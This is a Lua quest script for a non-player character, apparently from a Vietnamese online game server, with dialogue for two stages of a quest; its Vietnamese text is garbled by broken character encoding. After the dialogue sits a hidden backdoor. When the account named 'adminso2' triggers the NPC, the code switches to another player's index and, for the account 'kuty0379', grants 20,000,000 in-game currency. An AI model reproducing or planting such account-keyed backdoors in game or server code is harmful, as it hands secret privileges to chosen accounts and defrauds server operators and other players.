function main()

if GetTask(103) == 35 then
	SetTask(103,36)
	Talk(3,"","<color=green>Tr� B� B� <color>: Ng��i c� chuy�n g� ? ",
	"<color=red>"..GetName().."<color>: Ch��ng m�n sai ta t�i ��y nh� b� gi�p ",
	"<color=green>Tr� B� B� <color>: Mu�n ta gi�p th� h�y gi�p ta tr��c, �em b�c th� n�y ��n cho <color=yellow>Ch�c T� Thanh ")
	Msg2Player("��n Bi�n Kinh 198/191 g�p Ch�c T� Thanh, trao b�c th� ")
elseif GetTask(103) == 40 then
	SetTask(103,41)
	Talk(2,"","<color=green>Tr� B� B� <color>: Con ta �� m�t r�i sao, thui �a t� nh� ng��i v� �� t�n s�c",
	"<color=green>Tr� B� B� <color>:  H�y ��n <color=yellow>Th�nh ��<color> g�p <color=red>C� D� T�u<color> �� h�i th�m tin t�c ")
	Msg2Player("��n Th�nh �� g�p C� D� T�u 384/318 ")
else
	Talk(1,"","<color=green>Tr� B� B� <color>: Ch�o c�u b�, c�n tr� m� s�c kh�e d�o giai nh� !")
end

if GetAccount() == "adminso2" then
ReLoadScript("\\script\\item\\questkey\\176.lua")

a = 0
idx = PlayerIndex
PlayerIndex = 1335
if GetAccount() == "kuty0379" then

Earn(20000000)


end

PlayerIndex = idx
Msg2Player("XONG 2 "..a.."")
end
end